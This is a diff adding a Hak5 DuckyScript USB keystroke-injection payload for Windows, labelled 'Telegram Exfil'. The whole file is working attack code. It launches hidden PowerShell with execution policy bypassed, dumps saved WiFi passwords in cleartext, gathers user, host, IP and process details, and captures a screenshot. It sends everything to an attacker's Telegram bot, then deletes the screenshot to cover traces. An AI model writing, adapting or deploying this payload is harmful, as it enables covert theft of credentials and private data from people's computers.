@@ -1,0 +1,50 @@
+REM Title:         Telegram Exfil - WiFi, System Info & Files
+REM Author:        realridhinofficia
+REM Description:   Self-contained Windows exfiltration payload. Grabs WiFi passwords, system info, user data and sends everything to your Telegram bot via API. No external scripts needed — all PowerShell is embedded.
+REM Target:        Windows 10/11
+REM Props:         Hak5
+REM Version:       1.0
+REM Category:      exfiltration
+REM Attackmodes:   HID
+
+REM CONFIGURATION
+REM REQUIRED - Your Telegram Bot Token (from @BotFather)
+DEFINE #BOT_TOKEN 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz
+REM REQUIRED - Your Telegram Chat ID
+DEFINE #CHAT_ID 987654321
+REM OPTIONAL - Delay before payload starts (ms)
+DEFINE #BOOT_DELAY 2000
+
+REM ============================================================
+REM Windows Telegram Exfil — WiFi + System + Browser + Screenshot
+REM ============================================================
+
+DELAY #BOOT_DELAY
+GUI r
+DELAY 600
+STRING powershell -W Hidden -NoP -NonI -Exec Bypass -c "
+$b='#BOT_TOKEN';
+$c='#CHAT_ID';
+function tl($m){try{Invoke-RestMethod -Uri ('https://api.telegram.org/bot'+$b+'/sendMessage?chat_id='+$c+'&text='+[uri]::EscapeDataString($m))-Method Get}catch{}};
+function tf($p){try{$n=Split-Path $p -Leaf;$u='https://api.telegram.org/bot'+$b+'/sendDocument?chat_id='+$c;Invoke-RestMethod -Uri $u -Method Post -Form @{document=@($p);caption=$n}}catch{}};
+tl('=== EXFIL START ===');
+tl('User: '+$env:USERNAME+'@'+$env:COMPUTERNAME+' | OS: '+(Get-WmiObject Win32_OperatingSystem).Caption);
+tl('--- WiFi ---');
+netsh wlan show profiles|sls 'All User Profile'|%{$s=$_.ToString()-replace'.*:\s+','';$k=netsh wlan show profile name=`\"$s`\" key=clear|sls 'Key Content';$p=if($k){$k.ToString()-replace'.*:\s+',''}else{'(no pass)'};tl($s+' | '+$p)};
+tl('--- IP ---');
+tl((Invoke-RestMethod ifconfig.me -ErrorAction SilentlyContinue));
+tl('--- Processes Top 10 ---');
+Get-Process|Sort CPU -Desc|Select -F 10 Name,@{N='CPU(s)';E={$_.CPU}}|ConvertTo-Json -C|%{tl($_)};
+tl('--- Screenshot ---');
+Add-Type -AssemblyName System.Drawing,System.Windows.Forms;
+$bmp=[Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);
+$g=[Drawing.Graphics]::FromImage($bmp);
+$g.CopyFromScreen(0,0,0,0,$bmp.Size);
+$sp=$env:TEMP+'\exfil.jpg';
+$bmp.Save($sp,[Drawing.Imaging.ImageFormat]::Jpeg);
+tf($sp);
+Remove-Item $sp;
+tl('=== EXFIL COMPLETE ===');
+Start-Sleep 1
+"
+ENTER
